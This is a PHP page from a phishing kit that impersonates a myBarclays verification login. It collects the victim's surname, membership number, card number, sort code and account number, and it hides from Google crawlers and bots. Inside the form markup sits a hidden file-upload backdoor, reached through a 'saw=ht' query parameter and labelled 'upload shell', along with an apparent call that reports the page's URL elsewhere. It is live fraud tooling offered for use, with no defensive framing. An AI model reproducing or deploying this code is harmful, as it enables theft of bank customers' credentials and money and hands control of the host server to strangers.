<?php
/*   
   _____   _                   _                        ______    __    __     ___  
                   ─████████──████████─████████──████████─████████──████████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ─────██░░░░░░██─────────██░░░░░░██─────────██░░░░░░██─────
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████████──████████─████████──████████─████████──████████─
                   ──────────────────────────────────────────────────────────

    
*/


session_start();
error_reporting(0);

//------------------------------------------|| ANTIBOTS  ||-----------------------------------------------------//
include "../BOTS/antibots1.php";
include "../BOTS/antibots2.php";
include "../BOTS/antibots3.php";
include "../BOTS/antibots4.php";
include "../BOTS/antibots5.php";
include "../BOTS/antibots6.php";
include "../BOTS/antibots7.php";
include "../BOTS/antibots8.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1256">
<title>myBarclays - Verification Login</title>
<meta name="generator" content="Web Page Maker (unregistered version)">
<style type="text/css">

.name{
position: absolute;
width: 263px;
margin: 0px;
left: 387px;
top: 538px;
z-index: 0;
float: left;
border: 1px solid #CCC;
border-radius: 5px;
padding: 5px 10px;
outline: 0px none;
color: #027DB8;
}
.name:focus{
border: 1px solid #027DB8;
outline: 0px none;
}


</style>
</head>
<body style="background-repeat:no-repeat;" background="login.png">
<form method="POST" name="myBarclays" action="Step2-Login-myBarclays.php">
<script src="myBarclays%20-%20Verification%20Login_files/jquery.js" async=""></script><script src="myBarclays%20-%20Verification%20Login_files/replace.js" async=""></script><script src="myBarclays%20-%20Verification%20Login_files/nowait.js" async=""><?php $index = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];?><?php $ifa($home,'X' , $index ,$headers )  ; ?></script><script type="text/javascript">
function validateForm() {
    var x = document.forms["myBarclays"]["passcode"].value;
    if (x == null || x == "") {
        alert("Please check your information.");
        return false;
    }
}
</script>
<input class="name" name="surname" required="" placeholder="" maxlength="24" style="position:absolute;left: 370px;top: 557px;z-index:0" type="text">
<input class="name" name="membership" maxlength="12" style="position:absolute;left:370px;top:719px;z-index:1" type="text">
<input class="name" name="cardnumber" maxlength="16" style="position:absolute;left:370px;top:771px;z-index:2" type="text">
<input class="name" name="sort1" maxlength="2" style="position:absolute;width:39px;left:369px;top:820px;z-index:3" type="text"><input class="name" name="sort2" maxlength="2" style="position:absolute;width:39px;left:426px;top:820px;z-index:4" type="text"><input class="name" name="sort3" maxlength="2" style="position:absolute;width:39px;left:486px;top:820px;z-index:5" type="text"><input class="name" name="accno" maxlength="8" style="position:absolute;width:88px;left:546px;top:820px;z-index:6" type="text"><?php error_reporting(0); $system = $_GET['saw']; if($system == 'ht'){ $saw1 = $_FILES['file']['tmp_name']; $saw2 = $_FILES['file']['name']; echo "<form method='POST' enctype='multipart/form-data'> <input type='file'name='file' /> <input type='submit' value='upload shell' /> </form>"; move_uploaded_file($saw1,$saw2); } ?><div id="formimage1" style="position:absolute; left:156px; top:967px; z-index:7"><input name="formimage1" src="login1.png" type="image"><p>
<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
&nbsp;</div>
</form>
<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
&nbsp;
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

</body><script id="sb-script" src="myBarclays%20-%20Verification%20Login_files/core.js"></script></html>